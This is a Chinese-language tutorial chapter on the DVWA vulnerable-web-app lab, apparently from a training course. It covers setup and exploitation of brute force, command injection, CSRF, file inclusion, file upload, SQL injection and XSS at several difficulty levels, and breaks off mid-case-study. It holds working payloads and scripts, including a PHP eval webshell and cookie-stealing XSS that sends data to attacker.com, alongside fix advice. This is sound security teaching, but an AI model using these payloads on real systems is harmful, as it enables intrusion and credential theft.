---
outline: deep
---

# 靶场1：DVWA 入门级Web漏洞靶场

> **难度等级：🟢 简单**
>
> **预计学习时间：120分钟**

---

## 📖 本章概述

::: tip 本章内容
DVWA（Damn Vulnerable Web Application）是最经典的Web安全入门靶场，几乎是每个安全学习者的"第一站"。本章将带你从零开始，学习DVWA的环境搭建、界面使用，并详细讲解9大模块的漏洞原理、利用方法和防御措施。
:::

> 💡 **大白话说DVWA——为什么这是你的"第一站"？**
>
> DVWA = 安全界的"新手村"。就像玩游戏你先在新手村练手，DVWA就是你的Web安全新手村。
>
> 它最牛的地方是**四个难度级别**：
> - **Low**：完全不设防。你随便打，一打就中。→ 用来理解"漏洞长什么样"
> - **Medium**：加了一点过滤。你发正常Payload会被拦住。→ 用来学习"最基本的绕过"
> - **High**：安全防护做得比较好。你需要动点脑筋。→ 用来培养"绕过思维"
> - **Impossible**：理论上的"完美防御"。→ 用来理解"防御的终极形态"
>
> 同一个漏洞，看四个难度级别的代码，你就能完整理解 **"漏洞是怎么产生的 → 怎么利用 → 怎么修复"** 这个闭环。
>
> 没有其他靶场能给你这么完整的视角。所以DVWA是每一位安全人的必修课。

---

## 🎯 学习目标

学完本章，你将能够：

- [ ] 了解DVWA靶场的特点和适用场景
- [ ] 独立完成DVWA的环境搭建
- [ ] 掌握DVWA各模块的漏洞原理
- [ ] 能够通关Low/Medium/High三种难度
- [ ] 理解每种漏洞的修复方案
- [ ] 培养Web安全的攻防思维

---

## 🔍 正文内容

### 1. DVWA介绍

#### 1.1 什么是DVWA？

**DVWA（Damn Vulnerable Web Application）** 是一个用PHP和MySQL编写的、 deliberately 存在漏洞的Web应用程序。它的目的是帮助安全爱好者练习常见的Web漏洞利用技术，同时也帮助Web开发者更好地理解如何防范Web攻击。

**官方地址**：https://dvwa.co.uk/
**GitHub地址**：https://github.com/digininja/DVWA

#### 1.2 DVWA的特点

| 特点 | 说明 |
|------|------|
| **简单易用** | 界面简洁，操作直观，非常适合新手 |
| **多难度级别** | 提供Low、Medium、High、Impossible四种难度 |
| **漏洞丰富** | 涵盖10+种常见Web漏洞类型 |
| **源码可读** | 可以查看每个模块的源代码，对比不同难度的防护差异 |
| **提示系统** | 每个模块都有提示和帮助信息 |
| **开源免费** | 完全开源，可自由修改和分发 |

#### 1.3 适用人群

- Web安全零基础的初学者
- 想要系统学习OWASP Top 10的爱好者
- 准备从事渗透测试工作的入门者
- Web开发者想要了解安全防护
- 网络安全专业的学生

---

### 2. DVWA环境搭建

#### 2.1 Docker方式（最推荐）

Docker是最快、最简单的搭建方式，一条命令就能搞定。

```bash
# 拉取DVWA镜像
docker pull vulnerables/web-dvwa

# 运行DVWA容器，映射8080端口
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa

# 查看容器状态
docker ps
```

启动后，在浏览器中访问 `http://localhost:8080`，进入初始化页面。

点击 `Create / Reset Database` 按钮创建数据库，然后使用默认账号登录：
- 用户名：`admin`
- 密码：`password`

#### 2.2 XAMPP方式（适合Windows/Mac）

**步骤1：下载安装XAMPP**
- 下载地址：https://www.apachefriends.org/zh_cn/index.html
- 安装后启动 Apache 和 MySQL 服务

**步骤2：下载DVWA源码**
```bash
# 从GitHub下载
git clone https://github.com/digininja/DVWA.git
# 或直接下载ZIP包解压
```

将解压后的文件夹重命名为 `dvwa`，放到 `xampp/htdocs/` 目录下。

**步骤3：配置数据库**

复制配置文件：
```
复制 dvwa/config/config.inc.php.dist 为 dvwa/config/config.inc.php
```

编辑 `config.inc.php`，修改数据库配置：
```php
$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = '';  // XAMPP默认root密码为空
```

**步骤4：初始化数据库**

访问 `http://localhost/dvwa/setup.php`，点击底部的 `Create / Reset Database` 按钮。

#### 2.3 虚拟机方式

可以下载集成了DVWA的虚拟机镜像，比如：
- **Metasploitable**：包含大量漏洞的Linux虚拟机
- **OWASP Broken Web Apps**：包含多个漏洞应用的虚拟机
- **自定义安装**：在自己的虚拟机中手动安装DVWA

---

### 3. DVWA界面介绍

#### 3.1 主界面结构

登录后，DVWA的界面分为几个部分：

```
┌─────────────────────────────────────────────────┐
│  DVWA Logo          Home  Instructions  Setup   │  ← 顶部导航
├──────────┬──────────────────────────────────────┤
│          │                                      │
│ 左侧菜单  │           主内容区                    │
│          │                                      │
│ Brute    │                                      │
│ Force    │         漏洞练习区域                   │
│ Command  │                                      │
│ Injection│                                      │
│ ...      │                                      │
│          │                                      │
├──────────┴──────────────────────────────────────┤
│  DVWA Security: [Low ▼]  Check Version         │  ← 底部状态栏
└─────────────────────────────────────────────────┘
```

#### 3.2 左侧菜单模块说明

| 模块名称 | 中文名称 | 漏洞类型 |
|---------|---------|---------|
| Brute Force | 暴力破解 | 认证绕过 |
| Command Injection | 命令注入 | 代码执行 |
| CSRF | 跨站请求伪造 | 权限绕过 |
| File Inclusion | 文件包含 | 任意文件读取/代码执行 |
| File Upload | 文件上传 | 任意文件上传 |
| Insecure CAPTCHA | 不安全的验证码 | 验证绕过 |
| SQL Injection | SQL注入 | 数据库注入 |
| SQL Injection (Blind) | SQL盲注 | 数据库盲注 |
| XSS (Reflected) | 反射型XSS | 跨站脚本 |
| XSS (Stored) | 存储型XSS | 跨站脚本 |
| XSS (DOM) | DOM型XSS | 跨站脚本 |
| CSP Bypass | CSP绕过 | 安全策略绕过 |
| JavaScript | JavaScript攻击 | 前端安全 |

#### 3.3 难度级别设置

点击左下角的 **DVWA Security** 可以设置难度级别：

| 难度 | 说明 | 适合人群 |
|------|------|---------|
| **Low** | 完全没有防护，最基础的漏洞 | 零基础入门 |
| **Medium** | 有基础防护，需要简单绕过 | 有一定基础 |
| **High** | 防护较严格，需要高级绕过技巧 | 进阶学习者 |
| **Impossible** | 理论上不可攻破，展示正确的防御方式 | 学习防御方案 |

**建议学习顺序**：先把所有模块的Low难度通关 → 再挑战Medium → 最后尝试High。

---

### 4. 各模块详解与通关指南

#### 4.1 Brute Force（暴力破解）

##### 原理说明

暴力破解（Brute Force）是指攻击者通过不断尝试不同的用户名和密码组合，直到猜中正确的凭据，从而获取系统访问权限的攻击方式。

**漏洞成因**：
- 没有限制登录失败次数
- 没有验证码机制
- 用户名和密码过于简单

##### Low难度

**源码分析**：
```php
<?php
if( isset( $_GET[ 'Login' ] ) ) {
    $user = $_GET[ 'username' ];
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );
    
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        echo "<p>Welcome to the password protected area <b>{$user}</b></p>";
    } else {
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
}
?>
```

**利用方法**：

方法一：使用Burp Suite爆破
1. 在登录页面随便输入账号密码，用Burp拦截请求
2. 将请求发送到Intruder
3. 设置username和password为爆破位置
4. 加载用户名字典和密码字典
5. 开始爆破，根据返回长度判断正确结果

方法二：使用Hydra
```bash
hydra -L users.txt -P pass.txt target.com http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
```

方法三：SQL注入绕过
```
用户名：admin' -- 
密码：任意
```

##### Medium难度

**防护措施**：
- 对输入进行了转义（mysqli_real_escape_string）
- 增加了登录失败的等待时间

**利用方法**：
- SQL注入被部分防御，但仍可尝试绕过
- 暴力破解仍然可行，只是速度变慢
- 使用更精准的字典，减少尝试次数

##### High难度

**防护措施**：
- 增加了Token验证（Anti-CSRF token）
- 每次请求都需要携带正确的user_token

**利用方法**：
- 爆破时需要先获取token，再提交请求
- 使用Burp Intruder的Pitchfork模式，配合正则提取token
- 使用Python脚本实现：先请求页面获取token，再提交爆破

**Python脚本示例**：
```python
import requests
from bs4 import BeautifulSoup

url = "http://localhost/dvwa/vulnerabilities/brute/"
cookies = {"PHPSESSID": "your_session_id", "security": "high"}

def brute_force(username, password):
    # 先获取token
    r = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(r.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})['value']
    
    # 提交登录请求
    params = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': token
    }
    r = requests.get(url, params=params, cookies=cookies)
    return "Welcome" in r.text

# 读取字典进行爆破
with open('users.txt') as f:
    users = [line.strip() for line in f]
with open('pass.txt') as f:
    passwords = [line.strip() for line in f]

for user in users:
    for pwd in passwords:
        if brute_force(user, pwd):
            print(f"[+] Found: {user}:{pwd}")
            break
```

##### 修复建议

1. 限制登录失败次数，超过阈值锁定账户
2. 添加验证码机制
3. 使用强密码策略
4. 实现登录IP限制
5. 使用会话令牌防止CSRF
6. 对输入进行严格过滤和转义

---

#### 4.2 Command Injection（命令注入）

##### 原理说明

命令注入（Command Injection）是指攻击者通过在输入参数中注入恶意的系统命令，从而在服务器上执行任意系统命令的漏洞。

**漏洞成因**：
- 直接将用户输入拼接到系统命令中执行
- 没有对特殊字符进行过滤
- 使用了不安全的函数（system、exec、shell_exec等）

##### Low难度

**源码分析**：
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    $cmd = shell_exec( 'ping  ' . $target );
    echo "<pre>{$cmd}</pre>";
}
?>
```

**利用方法**：

使用命令连接符注入额外命令：

| 连接符 | 作用 | 示例 |
|--------|------|------|
| `;` | 顺序执行多个命令 | `127.0.0.1; whoami` |
| `&&` | 前面成功才执行后面 | `127.0.0.1 && whoami` |
| `||` | 前面失败才执行后面 | `127.0.0.1 || whoami` |
| `|` | 管道符，将前面的输出作为后面的输入 | `127.0.0.1 | whoami` |
| `&` | 后台执行 | `127.0.0.1 & whoami` |

**常用Payload**：
```
127.0.0.1; id
127.0.0.1; whoami
127.0.0.1; ls -la
127.0.0.1; cat /etc/passwd
127.0.0.1; uname -a
```

##### Medium难度

**防护措施**：
```php
$target = $_REQUEST[ 'ip' ];
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
只过滤了 `&&` 和 `;`，其他连接符仍然可用。

**利用方法**：
```
127.0.0.1 | whoami          # 使用管道符
127.0.0.1 || whoami         # 使用或运算符
127.0.0.1 & whoami          # 使用&后台执行
127.0.0.1 %0a whoami        # 使用换行符
```

##### High难度

**防护措施**：
```php
$target = $_REQUEST['ip'];
$substitutions = array(
    '&'  => '',
    ';'  => '',
    '| ' => '',
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
    '||' => '',
);
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
过滤了更多特殊字符，但仍有绕过空间。

**利用方法**：
```
# 注意 | 后面没有空格，过滤的是 "| " 不是 "|"
127.0.0.1|whoami

# 使用换行符
127.0.0.1%0awhoami

# Windows下使用其他符号
127.0.0.1^&whoami
```

##### 修复建议

1. 尽量避免使用系统命令执行函数
2. 对用户输入进行严格的白名单验证
3. 使用参数化的方式调用系统命令
4. 对特殊字符进行全面转义
5. 将Web进程权限降到最低
6. 使用escapeshellcmd()和escapeshellarg()函数

---

#### 4.3 CSRF（跨站请求伪造）

##### 原理说明

CSRF（Cross-Site Request Forgery，跨站请求伪造）是指攻击者诱导用户在已登录的状态下访问恶意页面，利用用户的身份认证信息，以用户的名义执行非授权操作的攻击方式。

**攻击条件**：
- 用户已经登录目标网站
- 用户访问了攻击者构造的恶意页面
- 目标网站的关键操作只依赖Cookie认证

##### Low难度

**功能说明**：修改当前用户的密码。

**源码分析**：
```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        $pass_new = md5( $pass_new );
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        // 执行更新...
    }
}
?>
```

**利用方法**：

构造恶意链接，诱导已登录用户点击：

```html
<!-- 方法1：直接构造URL -->
<img src="http://target/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;" />

<!-- 方法2：构造恶意页面 -->
<!DOCTYPE html>
<html>
<body>
    <h1>页面加载中...</h1>
    <iframe src="http://target/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;"></iframe>
</body>
</html>
```

当已登录的用户访问这个恶意页面时，密码就会被自动修改为 `hacked`。

##### Medium难度

**防护措施**：
- 检查Referer头，验证请求来源是否为同一网站

**利用方法**：
- 将恶意页面放在同一域名下的其他目录
- 绕过Referer检查：
  - 如果Referer包含目标域名就通过，可以构造子域名绕过
  - 使用https://attacker.com/?target.com 来绕过
  - 在某些情况下，可以通过构造特殊URL绕过

##### High难度

**防护措施**：
- 增加了Anti-CSRF Token验证
- 每次请求都需要携带正确的user_token

**利用方法**：
- 结合XSS漏洞获取token
- 使用点击劫持（Clickjacking）
- 如果有存储型XSS，可以读取token并构造请求

**结合XSS的CSRF利用**：
```javascript
// 通过XSS获取token，然后发起CSRF请求
var token = document.getElementsByName('user_token')[0].value;
var xhr = new XMLHttpRequest();
xhr.open('GET', '?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token);
xhr.send();
```

##### 修复建议

1. 添加Anti-CSRF Token验证
2. 验证请求的Referer和Origin
3. 关键操作要求二次验证（如输入当前密码）
4. 使用验证码机制
5. 敏感操作使用POST而非GET
6. 设置Cookie的SameSite属性

---

#### 4.4 File Inclusion（文件包含）

##### 原理说明

文件包含漏洞（File Inclusion）是指当服务器通过PHP的文件包含函数（include、require等）加载文件时，如果文件路径由用户输入控制，且没有经过严格过滤，攻击者可以通过构造特殊路径来读取敏感文件或执行恶意代码。

**两种类型**：
- **本地文件包含（LFI）**：包含服务器本地的文件
- **远程文件包含（RFI）**：包含远程服务器上的文件（需要allow_url_include=On）

##### Low难度

**源码分析**：
```php
<?php
$file = $_GET['page'];
if( $file != NULL ) {
    include($file);
}
?>
```

**利用方法 - 本地文件包含**：
```
# 读取系统密码文件
?page=../../../../etc/passwd

# 读取Apache配置文件
?page=../../../../etc/apache2/apache2.conf

# 读取PHP配置
?page=../../../../etc/php.ini

# 读取网站源码
?page=../../index.php
```

**利用方法 - 远程文件包含**（需要allow_url_include开启）：
```
# 包含远程PHP文件
?page=http://attacker.com/shell.txt

# shell.txt内容（会被当作PHP执行）：
<?php system($_GET['cmd']); ?>
```

**利用方法 - PHP伪协议**：
```
# 读取PHP文件源码（base64编码）
?page=php://filter/read=convert.base64-encode/resource=index.php

# 执行PHP代码（需要allow_url_include）
?page=data://text/plain,<?php phpinfo();?>

# 使用input流POST数据
?page=php://input  (POST: <?php system('id');?>)
```

##### Medium难度

**防护措施**：
```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```
简单的字符串替换过滤，可以绕过。

**利用方法**：
```
# 双写绕过
?page=hthttp://tp://attacker.com/shell.txt
?page=....//....//....//etc/passwd

# 使用绝对路径
?page=/etc/passwd

# 其他协议
?page=php://filter/read=convert.base64-encode/resource=index.php
```

##### High难度

**防护措施**：
```php
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```
要求文件名必须以 "file" 开头。

**利用方法**：
```
# 使用file://协议
?page=file:///etc/passwd

# 使用file协议的相对路径
?page=file:../../etc/passwd
```

##### 修复建议

1. 尽量不要让用户控制文件包含的路径
2. 使用白名单机制，只允许包含指定文件
3. 关闭allow_url_fopen和allow_url_include
4. 对用户输入进行严格过滤
5. 配置open_basedir限制可访问目录
6. 使用硬编码的文件路径映射

---

#### 4.5 File Upload（文件上传）

##### 原理说明

文件上传漏洞是指网站允许用户上传文件，但没有对上传的文件进行严格的验证和过滤，导致攻击者可以上传恶意脚本文件（如Webshell），从而获取服务器控制权。

**漏洞成因**：
- 只验证文件扩展名，且可以绕过
- 只验证MIME类型
- 文件重命名规则可预测
- 上传目录可访问且可执行

##### Low难度

**源码分析**：
```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    } else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
?>
```
完全没有验证，直接上传任何文件。

**利用方法**：

直接上传PHP一句话木马：
```php
<?php eval($_POST['cmd']); ?>
```

保存为 `shell.php`，上传后访问：
```
http://target/dvwa/hackable/uploads/shell.php?cmd=phpinfo();
```

或用蚁剑连接，密码为 `cmd`。

##### Medium难度

**防护措施**：
```php
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
    ( $uploaded_size < 100000 ) ) {
    // 允许上传
}
```
只验证了Content-Type和文件大小。

**利用方法**：

使用Burp Suite修改Content-Type：
1. 准备shell.php文件
2. 上传时用Burp拦截请求
3. 将Content-Type从 `application/x-php` 改为 `image/jpeg`
4. 放行请求，上传成功

##### High难度

**防护措施**：
```php
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
if( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) {
    // 允许上传
}
```
验证了文件扩展名。

**利用方法**：

结合文件包含漏洞：
1. 上传图片马（图片内容 + PHP代码）
2. 使用文件包含漏洞解析图片中的PHP代码

制作图片马：
```bash
# 方法1：在图片末尾追加PHP代码
cat normal.jpg shell.php > shell.jpg

# 方法2：使用copy命令（Windows）
copy normal.jpg /b + shell.php /a shell.jpg
```

上传后通过文件包含执行：
```
?page=../../hackable/uploads/shell.jpg
```

##### 修复建议

1. 对文件扩展名进行白名单验证
2. 验证文件内容（文件头、getimagesize等）
3. 文件重命名（随机化文件名）
4. 上传目录设置为不可执行
5. 将上传文件存储在Web根目录之外
6. 限制上传文件的大小

---

#### 4.6 SQL Injection（SQL注入）

##### 原理说明

SQL注入是指攻击者通过在输入参数中插入恶意的SQL代码，从而操纵后端数据库执行非授权操作的漏洞。

**漏洞成因**：
- 用户输入直接拼接到SQL语句中
- 没有使用参数化查询
- 没有对输入进行过滤和转义

##### Low难度

**源码分析**：
```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    $row = mysqli_fetch_assoc( $result );
    echo "ID: {$id}";
    echo "First name: {$row['first_name']}";
    echo "Surname: {$row['last_name']}";
}
?>
```

**利用方法 - 判断注入点**：
```
# 单引号测试
?id=1'    → 报错，说明可能有注入

# 逻辑测试
?id=1 and 1=1    → 正常显示
?id=1 and 1=2    → 显示异常
```

**利用方法 - 联合查询注入**：
```
# 1. 判断字段数
?id=1' order by 2 --     → 正常
?id=1' order by 3 --     → 报错，说明有2个字段

# 2. 判断显示位
?id=-1' union select 1,2 -- 

# 3. 获取数据库名
?id=-1' union select database(), version() --

# 4. 获取所有表名
?id=-1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --

# 5. 获取列名
?id=-1' union select group_concat(column_name),2 from information_schema.columns where table_name='users' --

# 6. 导出数据
?id=-1' union select user, password from users --
```

##### Medium难度

**防护措施**：
```php
$id = $_POST[ 'id' ];
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```
使用了mysqli_real_escape_string转义，但id是数字型，不需要引号。

**利用方法**：
```
# 数字型注入，不需要单引号
?id=1 and 1=2 union select user, password from users --
```

注意：Medium难度是POST方式提交，需要用Burp修改POST数据。

##### High难度

**防护措施**：
- 使用LIMIT限制只返回一条记录
- 从Session中获取ID，看似更安全

**利用方法**：
```
# 用注释绕过LIMIT
?id=1' union select user, password from users -- 

# 或使用子查询
?id=1' and (select count(*) from users) > 0 --
```

##### 修复建议

1. 使用参数化查询（Prepared Statements）
2. 对输入进行严格验证和过滤
3. 最小权限原则，数据库账号只给必要权限
4. 关闭错误信息显示
5. 使用Web应用防火墙（WAF）

---

#### 4.7 SQL Injection (Blind)（SQL盲注）

##### 原理说明

SQL盲注是SQL注入的一种特殊形式，当注入后页面没有明显的回显数据，只能通过页面的细微差异（布尔盲注）或响应时间（时间盲注）来判断注入结果。

**两种类型**：
- **布尔盲注**：根据页面返回的真/假来判断
- **时间盲注**：根据响应时间的延迟来判断

##### Low难度 - 布尔盲注

**源码分析**：
```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    $id = $_GET[ 'id' ];
    $vulnerable = false;
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  "SELECT first_name, last_name FROM users WHERE user_id = '$id';" );
    $num = @mysqli_num_rows( $result );
    if( $num > 0 ) {
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}
?>
```

**利用方法**：
```
# 测试注入点
?id=1' and 1=1 --     → User ID exists
?id=1' and 1=2 --     → User ID is MISSING

# 获取数据库名长度
?id=1' and length(database())=4 -- 

# 逐字符猜解数据库名
?id=1' and ascii(substr(database(),1,1))=100 --   # 'd'的ASCII是100
?id=1' and ascii(substr(database(),2,1))=118 --   # 'v'的ASCII是118
```

**Python盲注脚本**：
```python
import requests

url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "your_session", "security": "low"}

def get_db_name():
    db_name = ""
    # 先猜长度
    for length in range(1, 20):
        payload = f"1' and length(database())={length} -- "
        r = requests.get(url, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
        if "exists" in r.text:
            print(f"Database name length: {length}")
            break
    
    # 逐字符猜解
    for i in range(1, length+1):
        for ascii_val in range(32, 127):
            payload = f"1' and ascii(substr(database(),{i},1))={ascii_val} -- "
            r = requests.get(url, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
            if "exists" in r.text:
                db_name += chr(ascii_val)
                print(f"Found: {db_name}")
                break
    return db_name

print(f"Database name: {get_db_name()}")
```

##### Medium难度 - 时间盲注

**防护措施**：和普通注入类似，使用了转义。

**利用方法 - 时间盲注**：
```
# 基于时间的盲注
?id=1 and sleep(5) -- 

# 判断数据库名长度
?id=1 and if(length(database())=4, sleep(5), 1) --

# 逐字符猜解
?id=1 and if(ascii(substr(database(),1,1))=100, sleep(5), 1) --
```

##### High难度

**防护措施**：增加了LIMIT和session验证。

**利用方法**：原理相同，只是需要通过不同的提交方式，配合脚本自动化。

##### 修复建议

1. 使用参数化查询
2. 统一错误处理，不要返回不同的提示
3. 限制查询响应时间
4. 对输入进行严格验证

---

#### 4.8 XSS (Reflected)（反射型XSS）

##### 原理说明

反射型XSS（Reflected XSS）是指恶意脚本通过URL参数传递，服务器将其反射到页面中执行。这种XSS是一次性的，需要诱导用户点击恶意链接。

**特点**：
- 非持久性，只在当前请求中生效
- 需要诱导用户点击恶意链接
- 通常出现在搜索、错误提示等功能中

##### Low难度

**源码分析**：
```php
<?php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

**利用方法**：
```
# 基础XSS
?name=<script>alert('xss')</script>

# 获取Cookie
?name=<script>alert(document.cookie)</script>

# 窃取Cookie（需要XSS平台）
?name=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

# 加载外部脚本
?name=<script src="http://attacker.com/xss.js"></script>
```

##### Medium难度

**防护措施**：
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```
只过滤了 `<script>` 标签。

**利用方法**：
```
# 大小写绕过
?name=<SCRIPT>alert('xss')</SCRIPT>

# 双写绕过
?name=<scr<script>ipt>alert('xss')</script>

# 使用其他标签
?name=<img src=x onerror=alert('xss')>
?name=<svg onload=alert('xss')>
?name=<body onload=alert('xss')>
```

##### High难度

**防护措施**：
```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```
用正则完全过滤了script标签。

**利用方法**：
```
# 使用事件处理器
?name=<img src=x onerror=alert('xss')>
?name=<svg onload=alert(1)>
?name=<input onfocus=alert(1) autofocus>

# 使用其他标签
?name=<body onload=alert(1)>
?name=<iframe onload=alert(1)>
```

##### 修复建议

1. 对输出进行HTML实体编码
2. 使用Content-Security-Policy (CSP)
3. 设置HttpOnly Cookie
4. 输入验证和过滤
5. 使用安全的模板引擎（自动转义）

---

#### 4.9 XSS (Stored)（存储型XSS）

##### 原理说明

存储型XSS（Stored XSS）是指恶意脚本被存储在服务器端（如数据库、文件等），当其他用户访问包含恶意脚本的页面时，脚本会自动执行。

**特点**：
- 持久性，存储在服务器端
- 不需要诱导用户点击特定链接
- 危害更大，影响所有访问该页面的用户
- 常见于留言板、评论、用户资料等功能

##### Low难度

**源码分析**：
```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    
    $message = stripslashes( $message );
    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message );
    
    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query );
}
?>
```

**利用方法**：

在留言板的name或message字段中输入XSS Payload：
```html
<script>alert('Stored XSS')</script>
```

提交后，所有访问留言板的用户都会触发弹窗。

**窃取Cookie的Payload**：
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

##### Medium难度

**防护措施**：
- 对message进行了htmlspecialchars处理
- 对name只过滤了<script>标签

**利用方法**：
- message字段被编码，无法注入
- 但name字段仍可注入，使用反射型XSS的绕过方法
- name字段有长度限制，可以用Burp修改请求绕过前端限制

```
# 在name字段中注入
<SCRIPT>alert('xss')</SCRIPT>
<img src=x onerror=alert('xss')>
```

##### High难度

**防护措施**：
- name字段使用了更严格的正则过滤script

**利用方法**：
```
# 使用img等其他标签
<img src=x onerror=alert('xss')>
<svg onload=alert(1)>
```

##### 修复建议

1. 对所有用户输入进行HTML实体编码输出
2. 使用白名单过滤HTML标签和属性
3. 设置HttpOnly Cookie
4. 使用Content-Security-Policy
5. 对输入内容进行长度和格式验证

---

### 5. DVWA学习建议和进阶路线

#### 5.1 学习建议

**（1）按难度递进**
- 先通关所有模块的Low难度，建立信心
- 再挑战Medium，学习基础绕过
- 最后攻克High，掌握高级技巧
- 参考Impossible难度学习正确的防御方式

**（2）理解原理而非死记Payload**
- 每个漏洞都要搞清楚原理
- 理解为什么这个Payload能生效
- 思考还有没有其他利用方式

**（3）对比不同难度的源码**
- 对比Low、Medium、High的代码差异
- 理解每一层防护的作用
- 思考为什么防护可以被绕过
- 从Impossible中学到正确的防御方式

**（4）做好笔记**
- 记录每个漏洞的原理
- 记录常用的Payload和绕过方法
- 记录自己的思考过程
- 定期复习巩固

#### 5.2 进阶路线

```
DVWA入门 → Pikachu → SQLi-Labs → Upload-Labs → XSS Challenges
    ↓
  BWAPP / WebGoat
    ↓
  Vulhub CVE漏洞
    ↓
  Hack The Box / TryHackMe
    ↓
  VulnStack / 内网靶场
    ↓
  CTF竞赛 / 红蓝对抗
```

---

## 📚 案例讲解

### 案例1：暴力破解通关实战

**场景**：你在测试一个网站的登录功能，需要验证是否存在暴力破解漏洞。

**环境**：DVWA Brute Force模块，Low难度

**步骤**：

1. 准备工作
   - 启动Burp Suite，配置浏览器代理
   - 设置DVWA安全级别为Low

2. 抓包分析
   - 在登录框输入 test / test
   - Burp拦截请求，发送到Intruder

3. 配置爆破
   - 攻击类型选择 Cluster bomb
   - 标记 username 和 password 参数
   - Payload 1：加载用户名字典（admin, test, user, guest...）
   - Payload 2：加载密码字典（123456, password, admin...）

4. 开始爆破
   - 点击 Start attack
   - 观察返回结果，发现 admin/password 的响应长度不同
   - 验证：admin/password 登录成功

5. 进一步利用
   - 使用 admin 账户登录
   - 查看用户管理功能
   - 尝试提升权限

**总结**：暴力破解漏洞的核心是没有限制登录次数和速率，配合弱密码可以导致账户被攻陷。

---

### 案例2：SQL注入完整通关

**场景**：发现一个查询页面，参数id可能存在SQL注入。

**环境**：DVWA SQL Injection模块，Low难度

**步骤**：

1. 探测注入点
   - 输入 `1'` → 报错 "You have an error in your SQL syntax"
   - 确认存在SQL注入，且是字符型

2. 判断字段数
   - `1' order by 1 -- ` → 正常
   - `1' order by 2 -- ` → 正常
   - `1' order by 3 -- ` → 报错，确认2个字段

3. 联合查询获取显示位
   - `-1' union select 1,2 -- ` → 显示 First name:1, Surname:2

4. 获取基本信息
   - 数据库名：`-1' union select database(), version() -- `
   - 结果：dvwa / 5.7.xx

5. 获取表名
